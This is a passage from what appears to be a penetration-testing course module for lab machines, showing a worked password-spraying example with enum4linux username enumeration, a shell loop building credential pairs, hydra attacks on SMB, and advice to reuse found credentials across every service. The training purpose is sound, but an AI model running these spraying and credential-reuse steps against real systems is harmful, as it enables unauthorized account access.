and `$6$` are shell variables, and an unquoted hash is silently truncated, producing a
password that "does not work" for reasons that look like a bug in the exploit. And prefer
`-stdin` over a bare argument — `ps aux` on a shared system shows every other user your
command line, password included.

---

### 8.9 Password spraying in practice — a worked example

```bash
# 1. Enumerate usernames (module 03)
enum4linux -a TARGET | grep 'Local User'
#    -> helios, zeus

# 2. Read the leaked policy (Machine 12's attention.txt)
#    BANNED: epidioko, qwerty, baseball

# 3. Build the pair list
for u in helios zeus; do for p in epidioko qwerty baseball; do echo "$u:$p"; done; done > creds.txt

# 4. Attack with pairs, gently
hydra -C creds.txt smb://TARGET -t 2 -f
```

Six attempts, all of them derived from *enumerated facts* rather than from a generic
list. The workflow is the lesson:

1. **Enumerate the nouns** — usernames, from SMB RID cycling, WordPress author IDs,
   `VRFY`, or a leaked email.
2. **Harvest the candidates** — from the target's own content (`cewl`), its own policy
   documents, its own backups, or the breach corpora.
3. **Attack the cross product, throttled**, and stop at the first hit.
4. **Reuse the hit everywhere** — every service, every username, immediately.

Step 4 is what separates people who finish boxes from people who get a credential and
then stall. Keep a running `creds.txt` and, the moment you find a new pair, append it and
re-run `-C creds.txt` against SSH, FTP, SMB, MySQL and the CMS admin panel.

---

_Back to [Learning Path 1](README.md) · previous: [03 — Service and Network Attacks](03-Service-and-Network-Attacks.md) · next: [05 — Linux Privilege Escalation](05-Linux-Privilege-Escalation.md)._
